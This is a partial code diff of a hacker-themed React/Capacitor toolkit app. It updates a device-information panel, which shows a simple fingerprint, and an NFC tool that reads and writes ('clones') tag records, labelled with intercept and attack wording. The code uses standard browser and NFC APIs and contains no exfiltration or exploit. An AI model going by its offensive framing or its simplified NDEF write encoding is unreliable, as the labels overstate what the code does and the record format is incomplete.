-                      setTimeout(() => executeAttack(), 100);
-                    }}
-                    className="flex-1 sm:flex-initial bg-neon-green text-black px-3 py-2 sm:py-1 rounded text-xs sm:text-[10px] font-bold hover:bg-white hover:text-black transition-all whitespace-nowrap"
-                  >
-                    FIRE
+                    Fire
                   </button>
                 </div>
              </div>
@@ -916,26 +1097,27 @@ export function DeviceInfoTool({ tool, onClose }: { tool: ToolDef, onClose: () =
   const [scanning, setScanning] = useState(false);
   const [results, setResults] = useState<any[] | null>(null);
 
-  const scan = () => {
+  const scan = async () => {
     setScanning(true);
-    setTimeout(() => {
-      const mem = (navigator as any).deviceMemory;
-      const cores = navigator.hardwareConcurrency;
-      const info = [
-        { label: 'User Agent', value: navigator.userAgent },
-        { label: 'Platform', value: navigator.platform },
-        { label: 'Language', value: navigator.language },
-        { label: 'Screen Resolution', value: `${screen.width}x${screen.height}` },
-        { label: 'Color Depth', value: `${screen.colorDepth}-bit` },
-        { label: 'Device Memory', value: mem ? `${mem} GB` : 'Unknown' },
-        { label: 'Hardware Concurrency', value: cores ? `${cores} Cores` : 'Unknown' },
-        { label: 'Network Connection', value: navigator.onLine ? 'Online' : 'Offline' },
-        { label: 'Cookies Enabled', value: navigator.cookieEnabled ? 'Yes' : 'No' },
-        { label: 'Touch Points', value: navigator.maxTouchPoints }
-      ];
-      setResults(info);
-      setScanning(false);
-    }, 600);
+
+    // Simulate a bit of "interrogation" delay for effect
+    await new Promise(r => setTimeout(r, 800));
+
+    const info = [
+      { label: 'OS / Platform', value: `${Capacitor.getPlatform().toUpperCase()} (${navigator.platform})` },
+      { label: 'Native Runtime', value: Capacitor.isNativePlatform() ? 'CAPACITOR NATIVE' : 'WEB BROWSER' },
+      { label: 'User Agent', value: navigator.userAgent },
+      { label: 'Language', value: navigator.language },
+      { label: 'Screen Resolution', value: `${window.screen.width}x${window.screen.height} (@${window.devicePixelRatio}x)` },
+      { label: 'CPU Cores', value: `${navigator.hardwareConcurrency || 'Unknown'} Cores` },
+      { label: 'RAM Estimate', value: (navigator as any).deviceMemory ? `${(navigator as any).deviceMemory} GB` : 'Restricted' },
+      { label: 'Network Connection', value: navigator.onLine ? 'ONLINE' : 'OFFLINE' },
+      { label: 'CORS Capability', value: 'ENABLED' },
+      { label: 'Web Crypto API', value: window.crypto ? 'SECURE' : 'UNAVAILABLE' }
+    ];
+
+    setResults(info);
+    setScanning(false);
   };
 
   useEffect(() => { scan(); }, []);
@@ -962,11 +1144,14 @@ export function DeviceInfoTool({ tool, onClose }: { tool: ToolDef, onClose: () =
         ) : results ? (
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              {results.map((r, i) => (
-               <div key={i} className="border border-white/5 bg-[#050505] rounded-xl p-4 flex flex-col justify-center overflow-hidden">
-                 <span className="text-gray-500 text-[10px] font-bold uppercase tracking-widest mb-1 truncate">{r.label}</span>
+               <div key={i} className="border border-white/5 bg-[#050505] rounded-xl p-4 flex flex-col justify-center overflow-hidden hover:border-neon-green/20 transition-all group">
+                 <span className="text-gray-500 text-[10px] font-bold uppercase tracking-widest mb-1 truncate group-hover:text-neon-green/50 transition-colors">{r.label}</span>
                  <span className="text-neon-green text-xs font-mono break-words">{r.value}</span>
                </div>
              ))}
+             <div className="sm:col-span-2 p-3 bg-neon-green/5 border border-neon-green/20 rounded-lg text-center">
+                <p className="text-[10px] text-gray-500 font-mono uppercase italic">Unique Fingerprint: {btoa(navigator.userAgent).substring(0, 16)}...</p>
+             </div>
            </div>
         ) : null}
       </div>
@@ -1256,10 +1441,15 @@ function NfcTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
   const [scanning, setScanning] = useState(false);
   const [message, setMessage] = useState<string>('');
   const [records, setRecords] = useState<any[]>([]);
+  const [activeTab, setActiveTab] = useState<'read' | 'write'>('read');
+
+  // Write state
+  const [writeType, setWriteTab] = useState<'text' | 'uri'>('text');
+  const [writePayload, setWritePayload] = useState('');
+  const [writing, setWriting] = useState(false);
 
   useEffect(() => {
     return () => {
-      // cleanup on unmount
       if (Capacitor.isNativePlatform()) {
         CapacitorNfc.stopScanning().catch(() => {});
       }
@@ -1270,28 +1460,23 @@ function NfcTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
     (document.activeElement as HTMLElement)?.blur();
     try {
       if (Capacitor.isNativePlatform()) {
-        // Ensure permissions
-        try {
-           const status = await CapacitorNfc.checkPermissions();
-           if (status.nfc !== 'granted') {
-              const req = await CapacitorNfc.requestPermissions();
-              if (req.nfc !== 'granted') {
-                 setMessage('NFC Permission Denied.');
-                 return;
-              }
+        const status = await CapacitorNfc.checkPermissions();
+        if (status.nfc !== 'granted') {
+           const req = await CapacitorNfc.requestPermissions();
+           if (req.nfc !== 'granted') {
+              setMessage('NFC Permission Denied.');
+              return;
            }
-        } catch(e) {}
+        }
 
         setScanning(true);
         setMessage('Ready. Bring NFC tag near the device antenna...');
 
-        // Listen once for the scanned event
         await CapacitorNfc.addListener('nfcEvent', async (event) => {
-          setMessage(`Scanned Tag! Serial: ${event.tag.id || 'Unknown'} - Type: ${event.tag.type || 'Unknown'}`);
+          setMessage(`Scanned Tag! Serial: ${event.tag.id || 'Unknown'}`);
           const decoded = [];
           if (event.tag.ndefMessage) {
             for (const record of event.tag.ndefMessage) {
-               // The plugin usually parses text payloads into record.payload
                decoded.push({
                  type: record.type ? String.fromCharCode(...record.type) : 'Unknown',
                  data: record.payload ? String.fromCharCode(...record.payload) : '<binary>'
@@ -1307,9 +1492,8 @@ function NfcTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
 
         await CapacitorNfc.startScanning();
       } else {
-        // web fallback
         if (!('NDEFReader' in window)) {
-          setMessage('Cannot connect. Make sure NFC is turned on and supported by this device browser.');
+          setMessage('NFC not supported by browser.');
           setScanning(false);
           return;
         }
@@ -1317,27 +1501,9 @@ function NfcTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
         setMessage('Please bring an NFC tag near the device...');
         const ndef = new (window as any).NDEFReader();
         await ndef.scan();
-
-        ndef.addEventListener("readingerror", () => {
-          setMessage('Error reading NFC tag. Try again.');
-          setScanning(false);
-        });
-
         ndef.addEventListener("reading", ({ message, serialNumber }: any) => {
-          setMessage(`Read tag with Serial Number: ${serialNumber}`);
-          const decodedRecords = [];
-          for (const record of message.records) {
-            const textDecoder = new TextDecoder(record.encoding || 'utf-8');
-            try {
-              decodedRecords.push({
-                type: record.recordType,
-                mediaType: record.mediaType,
-                data: textDecoder.decode(record.data)
-              });
-            } catch(e) {
-              decodedRecords.push({ type: record.recordType, data: '<binary data>' });
-            }
-          }
+          setMessage(`Read tag: ${serialNumber}`);
+          const decodedRecords = message.records.map((r: any) => ({ type: r.recordType, data: new TextDecoder().decode(r.data) }));
           setRecords(decodedRecords);
           setScanning(false);
         });
@@ -1348,36 +1514,117 @@ function NfcTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
     }
   };
 
+  const handleWrite = async () => {
+    if (!writePayload) return;
+    setWriting(true);
+    setMessage('APPROACH TAG TO WRITE...');
+
+    try {
+      if (Capacitor.isNativePlatform()) {
+        // Prepare NDEF message
+        // Plugin usually takes payload as byte array or string depending on version
+        // We'll attempt a common format for Capacitor NFC plugins
+        await CapacitorNfc.write({
+          ndefMessage: [{
+            tnf: 1, // Well Known
+            type: writeType === 'text' ? [0x54] : [0x55], // 'T' or 'U'
+            payload: Array.from(new TextEncoder().encode(writePayload))
+          }]
+        });
+        setMessage('WRITE SUCCESSFUL!');
+      } else if ('NDEFReader' in window) {
+        const ndef = new (window as any).NDEFReader();
+        await ndef.write(writePayload);
+        setMessage('WRITE SUCCESSFUL!');
+      }
+    } catch (e: any) {
+      setMessage(`WRITE FAIL: ${e.message}`);
+    } finally {
+      setWriting(false);
+    }
+  };
+
   return (
     <CustomToolLayout tool={tool} onClose={onClose}>
-      <div className="space-y-6 block">
-        <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest flex items-center justify-between mb-4">
-          <span>NFC READER</span>
-          <button
-            onClick={startScan}
-            disabled={scanning}
-            className="bg-neon-green/10 text-neon-green border border-neon-green/30 px-3 py-1 rounded text-[10px] font-bold uppercase tracking-wider disabled:opacity-50 hover:bg-neon-green hover:text-black transition-all"
-          >
-            {scanning ? 'WAITING...' : 'START SCAN'}
-          </button>
-        </label>
-        
-        {scanning ? (
-           <div className="flex flex-col items-center justify-center p-12 border border-neon-green/20 rounded-xl bg-[#050505] shadow-[0_0_20px_rgba(57,255,20,0.1)]">
-             <div className="w-8 h-8 rounded-full border-2 border-neon-green/20 border-t-neon-green animate-spin mb-4" />
-             <p className="text-neon-green text-xs font-mono tracking-widest uppercase text-center">{message || 'WAITING FOR NFC TAG...'}</p>
-           </div>
+      <div className="flex flex-col h-full space-y-4">
+        <div className="flex gap-2 border-b border-white/5 pb-2 overflow-x-auto no-scrollbar">
+           <button onClick={() => setActiveTab('read')} className={`px-4 py-2 text-[10px] font-bold tracking-widest uppercase transition-all ${activeTab === 'read' ? 'text-neon-green bg-neon-green/10 rounded-lg' : 'text-gray-500'}`}>READ MODE</button>
+           <button onClick={() => setActiveTab('write')} className={`px-4 py-2 text-[10px] font-bold tracking-widest uppercase transition-all ${activeTab === 'write' ? 'text-neon-green bg-neon-green/10 rounded-lg' : 'text-gray-500'}`}>CLONE / WRITE</button>
+        </div>
+
+        {activeTab === 'read' ? (
+          <div className="space-y-6 flex flex-col h-full">
+            <div className="flex flex-col items-center justify-center p-10 border border-neon-green/20 bg-neon-green/5 rounded-3xl text-center relative overflow-hidden group">
+               <div className={`w-20 h-20 rounded-full border-2 ${scanning ? 'border-neon-green animate-pulse' : 'border-neon-green/20'} flex items-center justify-center mb-6`}>
+                  <Wifi size={32} className="text-neon-green rotate-90" />
+               </div>
+               <p className="text-[10px] text-gray-400 font-mono mb-8 uppercase tracking-widest max-w-[200px]">
+                 {message || 'Ready to intercept NDEF proximity data packets.'}
+               </p>
+               <button
+                 onClick={startScan} disabled={scanning}
+                 className="w-full bg-neon-green text-black py-4 rounded-2xl font-black uppercase text-xs tracking-widest shadow-lg shadow-neon-green/10 hover:bg-white transition-all disabled:opacity-50"
+               >
+                 {scanning ? 'SCANNING AIRWAVES...' : 'INITIALIZE INTERCEPT'}
+               </button>
+            </div>
+
+            {records.length > 0 && (
+               <div className="flex-1 bg-[#050505] rounded-2xl border border-white/5 p-4 space-y-3 overflow-auto max-h-[300px]">
+                 <h3 className="text-[9px] font-bold text-gray-500 tracking-widest uppercase mb-2">Decoded NDEF records ({records.length})</h3>
+                 {records.map((r, i) => (
+                    <div key={i} className="bg-black/40 border border-neon-green/10 p-4 rounded-xl space-y-2">
+                       <div className="flex justify-between items-center border-b border-white/5 pb-2">
+                          <span className="text-neon-green font-bold text-[10px] uppercase">TYPE: {r.type}</span>
+                          <Copy size={12} className="text-gray-600 hover:text-white cursor-pointer" onClick={() => copyToCb(r.data)} />
+                       </div>
+                       <p className="text-xs text-gray-300 font-mono break-all leading-relaxed">{r.data}</p>
+                    </div>
+                 ))}
+               </div>
+            )}
+          </div>
         ) : (
-           <div className="h-full border border-white/5 bg-[#050505] rounded-xl p-4 overflow-y-auto font-mono text-xs text-neon-green/80 flex flex-col gap-4">
-               {message && <div className="text-white mb-2">{message}</div>}
-               {records.map((r, i) => (
-                 <div key={i} className="border border-neon-green/10 p-2 rounded">
-                   <div className="text-gray-500 mb-1">Type: {r.type}</div>
-                   {r.mediaType && <div className="text-gray-500 mb-1">Media: {r.mediaType}</div>}
-                   <div className="break-words">{r.data}</div>
+          <div className="space-y-6 animate-in fade-in slide-in-from-bottom-2">
+            <div className="bg-black/50 border border-white/5 p-6 rounded-3xl space-y-6">
+               <div className="space-y-2">
+                  <label className="text-[10px] font-bold text-gray-500 uppercase tracking-widest">Data Structure</label>
+                  <div className="flex gap-2">
+                     <button onClick={() => setWriteTab('text')} className={`flex-1 py-2 text-[9px] font-bold rounded-lg border transition-all ${writeType === 'text' ? 'border-neon-green text-neon-green bg-neon-green/5' : 'border-white/10 text-gray-600'}`}>TEXT RECORD</button>
+                     <button onClick={() => setWriteTab('uri')} className={`flex-1 py-2 text-[9px] font-bold rounded-lg border transition-all ${writeType === 'uri' ? 'border-neon-green text-neon-green bg-neon-green/5' : 'border-white/10 text-gray-600'}`}>URI / LINK</button>
+                  </div>
+               </div>
+
+               <div className="space-y-2">
+                  <label className="text-[10px] font-bold text-gray-500 uppercase tracking-widest">Payload Content</label>
+                  <textarea
+                    value={writePayload} onChange={e => setWritePayload(e.target.value)}
+                    placeholder={writeType === 'text' ? 'Enter text message...' : 'https://pwnnet.toolkit'}
+                    className="w-full bg-[#050505] border border-white/10 rounded-2xl p-4 text-xs text-neon-green font-mono h-32 focus:border-neon-green/50 outline-none"
+                  />
+               </div>
+
+               <button
+                 onClick={handleWrite} disabled={writing || !writePayload}
+                 className="w-full bg-red-500/10 text-red-500 border border-red-500/30 py-4 rounded-2xl font-black uppercase text-xs tracking-widest hover:bg-red-500 hover:text-white transition-all disabled:opacity-30"
+               >
+                 {writing ? 'WRITING TO SECTOR...' : 'COMMIT TO TAG'}
+               </button>
+
+               {message && (
+                 <div className="p-3 bg-black border border-white/5 rounded-xl text-center">
+                    <p className="text-[9px] text-neon-green font-bold uppercase tracking-tighter">{message}</p>
                  </div>
-               ))}
-           </div>
+               )}
+            </div>
+
+            <div className="p-4 bg-yellow-500/5 border border-yellow-500/20 rounded-2xl">
+               <p className="text-[9px] text-yellow-500/80 font-mono leading-relaxed uppercase">
+                 <VaultShield size={10} className="inline mr-1 mb-0.5" />
+                 SECURITY NOTICE: NDEF Writing overwrites sector 0. Ensure target tag is rewritable and not locked by manufacturer password.
+               </p>
+            </div>
+          </div>
         )}
       </div>
     </CustomToolLayout>
